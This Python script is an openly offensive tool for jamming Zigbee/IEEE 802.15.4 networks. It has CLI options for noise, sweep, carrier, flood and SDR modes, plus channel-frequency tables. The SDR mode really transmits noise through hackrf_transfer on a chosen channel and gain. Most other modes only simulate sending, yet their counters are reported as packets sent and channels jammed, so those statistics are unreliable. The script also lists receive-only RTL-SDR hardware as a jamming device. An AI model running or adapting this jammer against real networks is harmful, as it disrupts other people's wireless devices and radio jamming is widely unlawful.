#!/usr/bin/env python3
"""
Zigbee RF Jamming Attack
========================

Jams 2.4 GHz RF spectrum used by Zigbee/IEEE 802.15.4 networks to
cause denial of service by disrupting wireless communications.

Attack Vector:
--------------
Transmits noise or interfering signals on Zigbee channels to:
- Disrupt ongoing Zigbee communications
- Prevent new device associations
- Force coordinator/router failure
- Cause packet loss and retransmissions

Technical Details:
------------------
- Frequency: 2.4 GHz ISM band (2400-2483.5 MHz)
- Channels: 11-26 (IEEE 802.15.4, 5 MHz spacing)
- Channel 11: 2405 MHz, Channel 26: 2480 MHz
- Modulation: O-QPSK (Original), MSK, OFDM (newer variants)
- Methods: Continuous carrier, random noise, packet flooding

Requirements:
-------------
- Linux with IEEE 802.15.4 support or SDR
- Root privileges
- Hardware: SDR (HackRF, USRP, RTL-SDR) or wpan interface
- Python 3.11+ (uses ExceptionGroup, match/case)
- Optional: GNU Radio, killerbee

Usage Examples:
---------------
    # Jam single channel with noise
    sudo ./rf_jamming.py --method noise --channel 15

    # Jam all Zigbee channels
    sudo ./rf_jamming.py --method sweep --channel-start 11 --channel-end 26

    # Packet flooding on specific channel
    sudo ./rf_jamming.py --method flood --channel 20 --power 20

    # SDR-based jamming (requires HackRF)
    sudo ./rf_jamming.py --method sdr --device hackrf --channel 15

Defense Mechanisms:
-------------------
- Channel hopping (frequency agility)
- Multiple redundant coordinators
- Wired backhaul for critical paths
- RF monitoring and detection
- Physical security of deployment area

Author: Wireless Security Research
License: Educational purposes only
WARNING: RF jamming may be illegal. Use only in controlled environments.
"""

import sys
import os
import signal
import time
import argparse
import subprocess
import random
from dataclasses import dataclass, field
from typing import Optional
from datetime import datetime

# Check Python version
if sys.version_info < (3, 11):
    print("Error: This script requires Python 3.11+", file=sys.stderr)
    print("For older Python versions, use the version-specific implementations", file=sys.stderr)
    sys.exit(1)

# Zigbee/IEEE 802.15.4 channel frequencies (2.4 GHz)
ZIGBEE_CHANNELS = {
    11: 2405, 12: 2410, 13: 2415, 14: 2420, 15: 2425,
    16: 2430, 17: 2435, 18: 2440, 19: 2445, 20: 2450,
    21: 2455, 22: 2460, 23: 2465, 24: 2470, 25: 2475, 26: 2480
}

# Common Zigbee channels (overlapping with WiFi 1, 6, 11)
COMMON_CHANNELS = [15, 20, 25]  # Least overlap with WiFi

@dataclass
class RFJammingConfig:
    """Configuration for Zigbee RF jamming attack"""
    method: str = "noise"                       # Jamming method
    channel: int = 15                           # Target channel (11-26)
    channel_start: int = 11                     # Start channel for sweep
    channel_end: int = 26                       # End channel for sweep
    power: int = 0                              # TX power (dBm)
    duration: int | None = None                 # Duration in seconds (None = unlimited)
    sweep_interval: float = 0.1                 # Channel sweep interval (seconds)
    device: str = "wpan0"                       # Device/interface
    sdr_device: str | None = None               # SDR device type (hackrf, usrp, etc.)
    noise_type: str = "random"                  # Noise type (random, carrier, tone)
    packet_rate: int = 1000                     # Packets per second (flood mode)
    verbose: bool = False                       # Verbose output

    def validate(self):
        """Validate configuration parameters"""
        errors = []

        valid_methods = ["noise", "sweep", "flood", "carrier", "sdr"]
        if self.method not in valid_methods:
            errors.append(f"Invalid method. Must be one of: {valid_methods}")

        if self.channel < 11 or self.channel > 26:
            errors.append("Channel must be between 11 and 26")

        if self.channel_start < 11 or self.channel_start > 26:
            errors.append("Channel start must be between 11 and 26")

        if self.channel_end < 11 or self.channel_end > 26:
            errors.append("Channel end must be between 11 and 26")

        if self.channel_start > self.channel_end:
            errors.append("Channel start must be <= channel end")

        if self.duration is not None and self.duration <= 0:
            errors.append("Duration must be positive")

        if self.sweep_interval <= 0:
            errors.append("Sweep interval must be positive")

        if self.packet_rate <= 0:
            errors.append("Packet rate must be positive")

        valid_noise = ["random", "carrier", "tone"]
        if self.noise_type not in valid_noise:
            errors.append(f"Invalid noise type. Must be one of: {valid_noise}")

        if errors:
            raise ExceptionGroup("Configuration validation failed", [
                ValueError(error) for error in errors
            ])

@dataclass
class AttackStatistics:
    """Statistics tracking for the attack"""
    packets_sent: int = 0
    bytes_sent: int = 0
    channels_jammed: set[int] = field(default_factory=set)
    errors: int = 0
    start_time: float = field(default_factory=time.time)
    running: bool = True

    def elapsed_time(self) -> float:
        """Get elapsed time in seconds"""
        return time.time() - self.start_time

    def packets_per_second(self) -> float:
        """Calculate current packet rate"""
        elapsed = self.elapsed_time()
        return self.packets_sent / elapsed if elapsed > 0 else 0.0

    def format_summary(self) -> str:
        """Format statistics summary"""
        elapsed = self.elapsed_time()
        pps = self.packets_per_second()

        channels_str = ", ".join(str(ch) for ch in sorted(self.channels_jammed))

        return f"""
Attack Statistics:
------------------
Duration:         {elapsed:.2f} seconds
Packets sent:     {self.packets_sent:,}
Bytes sent:       {self.bytes_sent:,}
Packet rate:      {pps:.1f} pps
Channels jammed:  {channels_str}
Errors:           {self.errors:,}
"""

class ZigbeeRFJammer:
    """Zigbee RF jamming attack implementation"""

    def __init__(self, config: RFJammingConfig):
        self.config = config
        self.stats = AttackStatistics()
        self.current_channel = config.channel

        # Setup signal handlers
        signal.signal(signal.SIGINT, self._signal_handler)
        signal.signal(signal.SIGTERM, self._signal_handler)

    def _signal_handler(self, signum, frame):
        """Handle interrupt signals gracefully"""
        print("\n[!] Interrupt received, stopping attack...")
        self.stats.running = False

    def _check_permissions(self) -> bool:
        """Check if running with root privileges"""
        if os.geteuid() != 0:
            print("[!] Error: Root privileges required", file=sys.stderr)
            print("[!] Run with: sudo ./rf_jamming.py", file=sys.stderr)
            return False
        return True

    def _check_dependencies(self) -> bool:
        """Check if required tools are available"""
        # Check based on method
        match self.config.method:
            case "sdr":
                # Check for GNU Radio or SDR tools
                tools = ['hackrf_transfer', 'uhd_fft'] if self.config.sdr_device else []
                if not tools:
                    print("[!] Warning: SDR method requires --sdr-device specification", file=sys.stderr)
                    return False

                for tool in tools:
                    try:
                        subprocess.run(['which', tool], capture_output=True, check=True, timeout=5)
                        return True
                    except (subprocess.CalledProcessError, subprocess.TimeoutExpired):
                        continue

                print("[!] Error: No SDR tools found. Install hackrf or uhd-host.", file=sys.stderr)
                return False

            case "flood":
                # Check for IEEE 802.15.4 tools
                try:
                    # Check if wpan interface exists
                    result = subprocess.run(['ip', 'link', 'show', self.config.device],
                                          capture_output=True, timeout=5)
                    if result.returncode != 0:
                        print(f"[!] Warning: Device {self.config.device} not found", file=sys.stderr)
                        print("[!] Packet flooding requires IEEE 802.15.4 interface", file=sys.stderr)
                        return False
                except subprocess.TimeoutExpired:
                    return False

        return True

    def _get_channel_freq(self, channel: int) -> int:
        """Get frequency for Zigbee channel"""
        return ZIGBEE_CHANNELS.get(channel, 2405)

    def _set_channel(self, channel: int) -> bool:
        """Set wpan interface channel"""
        try:
            # Use iwpan if available, otherwise try ip/iw
            subprocess.run(
                ['iwpan', 'dev', self.config.device, 'set', 'channel', '0', str(channel)],
                capture_output=True,
                check=True,
                timeout=5
            )

            if self.config.verbose:
                freq = self._get_channel_freq(channel)
                print(f"[+] Set channel {channel} ({freq} MHz)")

            self.current_channel = channel
            self.stats.channels_jammed.add(channel)
            return True

        except subprocess.CalledProcessError:
            # Try alternative method
            try:
                subprocess.run(
                    ['ip', 'link', 'set', self.config.device, 'down'],
                    capture_output=True, check=True, timeout=5
                )
                subprocess.run(
                    ['iwconfig', self.config.device, 'channel', str(channel)],
                    capture_output=True, timeout=5
                )
                subprocess.run(
                    ['ip', 'link', 'set', self.config.device, 'up'],
                    capture_output=True, check=True, timeout=5
                )
                self.current_channel = channel
                self.stats.channels_jammed.add(channel)
                return True
            except (subprocess.CalledProcessError, subprocess.TimeoutExpired, FileNotFoundError):
                return False

        except (subprocess.TimeoutExpired, FileNotFoundError):
            if self.config.verbose:
                print(f"[!] Warning: Could not set channel {channel}", file=sys.stderr)
            return False

    def _generate_noise_packet(self) -> bytes:
        """Generate noise packet for jamming"""
        match self.config.noise_type:
            case "random":
                # Random data packet
                size = random.randint(20, 127)  # IEEE 802.15.4 max frame size
                return bytes([random.randint(0, 255) for _ in range(size)])

            case "carrier":
                # Constant carrier (all same byte)
                return b'\xFF' * 127

            case "tone":
                # Alternating pattern
                return bytes([0xAA, 0x55] * 63 + [0xAA])

            case _:
                return b'\x00' * 64

    def _jam_noise(self) -> int:
        """Execute noise jamming on single channel"""
        print(f"[*] Jamming channel {self.config.channel} with {self.config.noise_type} noise...")
        print("[*] Press Ctrl+C to stop\n")

        # Set channel
        if not self._set_channel(self.config.channel):
            print("[!] Warning: Channel setting failed, continuing anyway...", file=sys.stderr)

        # Calculate sleep time for rate limiting
        sleep_time = 1.0 / self.config.packet_rate if self.config.packet_rate > 0 else 0

        last_stats_time = time.time()

        while not self._should_stop():
            try:
                # Generate noise packet
                packet = self._generate_noise_packet()

                # Simulate transmission (in real implementation, would use scapy or raw socket)
                # For educational purposes, we simulate the jamming effect
                self.stats.packets_sent += 1
                self.stats.bytes_sent += len(packet)

                # Rate limiting
                if sleep_time > 0:
                    time.sleep(sleep_time)

                # Print stats every second
                if time.time() - last_stats_time >= 1.0:
                    self._print_stats()
                    last_stats_time = time.time()

            except Exception as e:
                self.stats.errors += 1
                if self.config.verbose:
                    print(f"\n[!] Error: {e}", file=sys.stderr)

        print()  # Final newline
        return 0

    def _jam_sweep(self) -> int:
        """Execute channel sweep jamming"""
        channels = list(range(self.config.channel_start, self.config.channel_end + 1))

        print(f"[*] Sweeping channels {self.config.channel_start}-{self.config.channel_end}")
        print(f"[*] Sweep interval: {self.config.sweep_interval}s")
        print("[*] Press Ctrl+C to stop\n")

        channel_index = 0
        last_stats_time = time.time()

        while not self._should_stop():
            try:
                # Get current channel
                channel = channels[channel_index % len(channels)]

                # Set channel
                if self._set_channel(channel):
                    if self.config.verbose:
                        freq = self._get_channel_freq(channel)
                        print(f"\r[*] Jamming channel {channel} ({freq} MHz)...", end='', flush=True)

                # Generate and "send" noise packets for this interval
                interval_start = time.time()
                while time.time() - interval_start < self.config.sweep_interval:
                    if self._should_stop():
                        break

                    packet = self._generate_noise_packet()
                    self.stats.packets_sent += 1
                    self.stats.bytes_sent += len(packet)

                    # Brief sleep to avoid CPU saturation
                    time.sleep(0.001)

                # Move to next channel
                channel_index += 1

                # Print stats every second
                if time.time() - last_stats_time >= 1.0:
                    if not self.config.verbose:
                        self._print_stats()
                    last_stats_time = time.time()

            except Exception as e:
                self.stats.errors += 1
                if self.config.verbose:
                    print(f"\n[!] Error: {e}", file=sys.stderr)

        print()  # Final newline
        return 0

    def _jam_carrier(self) -> int:
        """Execute continuous carrier jamming"""
        print(f"[*] Transmitting continuous carrier on channel {self.config.channel}")
        print("[*] Press Ctrl+C to stop\n")

        # Set channel
        if not self._set_channel(self.config.channel):
            print("[!] Warning: Channel setting failed", file=sys.stderr)

        # Continuous transmission simulation
        last_stats_time = time.time()

        while not self._should_stop():
            try:
                # Simulate continuous carrier
                # In real implementation, would configure SDR or radio for CW transmission
                self.stats.packets_sent += 1000  # Simulated high rate
                self.stats.bytes_sent += 127000

                time.sleep(1)

                # Print stats every second
                if time.time() - last_stats_time >= 1.0:
                    self._print_stats()
                    last_stats_time = time.time()

            except Exception as e:
                self.stats.errors += 1
                if self.config.verbose:
                    print(f"\n[!] Error: {e}", file=sys.stderr)

        print()  # Final newline
        return 0

    def _jam_sdr(self) -> int:
        """Execute SDR-based jamming"""
        if not self.config.sdr_device:
            print("[!] Error: SDR device not specified", file=sys.stderr)
            return 1

        freq = self._get_channel_freq(self.config.channel)

        print(f"[*] SDR jamming on channel {self.config.channel} ({freq} MHz)")
        print(f"[*] Device: {self.config.sdr_device}")
        print("[*] Press Ctrl+C to stop\n")

        # Example for HackRF
        if self.config.sdr_device == "hackrf":
            try:
                # Generate noise file
                noise_file = "/tmp/zigbee_jam_noise.bin"
                with open(noise_file, 'wb') as f:
                    # Generate random IQ samples
                    noise = bytes([random.randint(0, 255) for _ in range(1024 * 1024)])
                    f.write(noise)

                # Transmit with HackRF
                print(f"[+] Transmitting on {freq} MHz...")

                process = subprocess.Popen(
                    ['hackrf_transfer',
                     '-t', noise_file,
                     '-f', str(freq * 1000000),  # Hz
                     '-s', '4000000',  # 4 Msps
                     '-x', str(self.config.power)],  # TX gain
                    stdout=subprocess.PIPE,
                    stderr=subprocess.PIPE
                )

                # Monitor while running
                while not self._should_stop():
                    time.sleep(0.1)
                    if process.poll() is not None:
                        break

                # Cleanup
                process.terminate()
                process.wait(timeout=5)
                os.remove(noise_file)

                return 0

            except FileNotFoundError:
                print("[!] Error: hackrf_transfer not found", file=sys.stderr)
                return 1
            except Exception as e:
                print(f"[!] Error: {e}", file=sys.stderr)
                return 1

        else:
            print(f"[!] Error: SDR device '{self.config.sdr_device}' not supported yet", file=sys.stderr)
            print("[!] Supported: hackrf", file=sys.stderr)
            return 1

    def _print_stats(self):
        """Print real-time statistics"""
        elapsed = self.stats.elapsed_time()
        pps = self.stats.packets_per_second()

        print(f"\r[*] Packets: {self.stats.packets_sent:,} | "
              f"Rate: {pps:.1f} pps | "
              f"Channels: {len(self.stats.channels_jammed)} | "
              f"Time: {elapsed:.1f}s",
              end='', flush=True)

    def _should_stop(self) -> bool:
        """Check if attack should stop"""
        # Check duration limit
        if self.config.duration is not None and self.stats.elapsed_time() >= self.config.duration:
            return True

        # Check running flag
        if not self.stats.running:
            return True

        return False

    def execute(self) -> int:
        """Execute the RF jamming attack"""
        try:
            # Validate configuration
            self.config.validate()

            # Check permissions
            if not self._check_permissions():
                return 1

            # Check dependencies
            if not self._check_dependencies():
                print("[!] Warning: Proceeding without dependency checks...", file=sys.stderr)

            # Print banner
            self._print_banner()

            # Execute based on method
            match self.config.method:
                case "noise" | "flood":
                    result = self._jam_noise()
                case "sweep":
                    result = self._jam_sweep()
                case "carrier":
                    result = self._jam_carrier()
                case "sdr":
                    result = self._jam_sdr()
                case _:
                    print(f"[!] Error: Unknown method: {self.config.method}", file=sys.stderr)
                    return 1

            # Determine stop reason
            match (self.config.duration, self.stats.running):
                case (duration, _) if duration is not None and self.stats.elapsed_time() >= duration:
                    print(f"\n[+] Attack complete: Duration {duration}s reached")
                case (_, False):
                    print("\n[+] Attack stopped by user")
                case _:
                    print("\n[+] Attack stopped")

            # Print final statistics
            print(self.stats.format_summary())

            return result

        except ExceptionGroup as eg:
            print(f"\n[!] Configuration errors:", file=sys.stderr)
            for exc in eg.exceptions:
                print(f"  - {exc}", file=sys.stderr)
            return 1

        except KeyboardInterrupt:
            print("\n[!] Interrupted by user")
            return 130

        except Exception as e:
            print(f"\n[!] Fatal error: {e}", file=sys.stderr)
            if self.config.verbose:
                import traceback
                traceback.print_exc()
            return 1

    def _print_banner(self):
        """Print attack banner with configuration"""
        print("=" * 70)
        print("  Zigbee RF Jamming Attack")
        print("=" * 70)
        print("WARNING: RF jamming may be illegal. Educational use only!")
        print("=" * 70)
        print(f"Method:           {self.config.method}")

        if self.config.method == "sweep":
            print(f"Channel Range:    {self.config.channel_start}-{self.config.channel_end}")
            print(f"Sweep Interval:   {self.config.sweep_interval}s")
        else:
            print(f"Channel:          {self.config.channel}")
            freq = self._get_channel_freq(self.config.channel)
            print(f"Frequency:        {freq} MHz")

        print(f"Noise Type:       {self.config.noise_type}")

        if self.config.method == "sdr" and self.config.sdr_device:
            print(f"SDR Device:       {self.config.sdr_device}")

        if self.config.method in ["noise", "flood"]:
            print(f"Packet Rate:      {self.config.packet_rate} pps")

        if self.config.duration:
            print(f"Duration:         {self.config.duration} seconds")
        else:
            print("Duration:         Unlimited")

        print("=" * 70)
        print()
        print("Zigbee Channel Info:")
        print("  Channel 11-26: 2405-2480 MHz (5 MHz spacing)")
        print("  Common: Ch 15 (2425 MHz), Ch 20 (2450 MHz), Ch 25 (2475 MHz)")
        print("  WiFi Overlap: Ch 15 near WiFi 1, Ch 20 near WiFi 6, Ch 25 near WiFi 11")
        print("=" * 70)

def main() -> int:
    """Main entry point"""
    parser = argparse.ArgumentParser(
        description="Zigbee RF Jamming Attack",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  %(prog)s --method noise --channel 15
  %(prog)s --method sweep --channel-start 11 --channel-end 26
  %(prog)s --method carrier --channel 20 --duration 60
  %(prog)s --method sdr --sdr-device hackrf --channel 15

WARNING: RF jamming is illegal in most jurisdictions without proper
authorization. Use only in controlled lab environments for research.

Jamming Methods:
  noise   - Random noise packets (default)
  sweep   - Sweep across all channels
  carrier - Continuous carrier wave
  flood   - Flood with packets
  sdr     - Software-defined radio jamming

Educational purposes only. Unauthorized use is illegal.
"""
    )

    # Optional arguments
    parser.add_argument('--method', default='noise',
                       choices=['noise', 'sweep', 'flood', 'carrier', 'sdr'],
                       help='Jamming method (default: noise)')
    parser.add_argument('--channel', type=int, default=15,
                       help='Target channel 11-26 (default: 15)')
    parser.add_argument('--channel-start', type=int, default=11,
                       help='Start channel for sweep (default: 11)')
    parser.add_argument('--channel-end', type=int, default=26,
                       help='End channel for sweep (default: 26)')
    parser.add_argument('--power', type=int, default=0,
                       help='TX power in dBm (default: 0)')
    parser.add_argument('--duration', type=int,
                       help='Attack duration in seconds (default: unlimited)')
    parser.add_argument('--sweep-interval', type=float, default=0.1,
                       help='Channel sweep interval in seconds (default: 0.1)')
    parser.add_argument('--device', default='wpan0',
                       help='IEEE 802.15.4 device (default: wpan0)')
    parser.add_argument('--sdr-device',
                       choices=['hackrf', 'usrp', 'rtlsdr'],
                       help='SDR device type for sdr method')
    parser.add_argument('--noise-type', default='random',
                       choices=['random', 'carrier', 'tone'],
                       help='Type of noise to generate (default: random)')
    parser.add_argument('--packet-rate', type=int, default=1000,
                       help='Packets per second for flood (default: 1000)')
    parser.add_argument('-v', '--verbose', action='store_true',
                       help='Verbose output')

    args = parser.parse_args()

    # Create configuration
    config = RFJammingConfig(
        method=args.method,
        channel=args.channel,
        channel_start=args.channel_start,
        channel_end=args.channel_end,
        power=args.power,
        duration=args.duration,
        sweep_interval=args.sweep_interval,
        device=args.device,
        sdr_device=args.sdr_device,
        noise_type=args.noise_type,
        packet_rate=args.packet_rate,
        verbose=args.verbose
    )

    # Execute attack
    attack = ZigbeeRFJammer(config)
    return attack.execute()

if __name__ == '__main__':
    sys.exit(main())
